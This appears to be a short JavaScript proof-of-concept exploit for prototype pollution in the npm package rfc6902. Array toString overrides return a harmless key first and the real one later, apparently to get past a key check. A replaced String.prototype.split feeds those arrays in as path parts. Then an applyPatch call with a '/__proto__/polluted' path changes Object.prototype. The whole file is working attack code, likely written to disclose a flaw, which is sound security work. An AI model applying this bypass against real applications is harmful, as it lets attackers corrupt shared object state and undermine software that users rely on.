var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
console.log({}.polluted);
var rfc6902 = require('rfc6902');
var obj = {};
rfc6902.applyPatch(obj, [{
        op: 'add',
        path: '/__proto__/polluted',
        value: 'yes'
    }]);
console.log({}.polluted);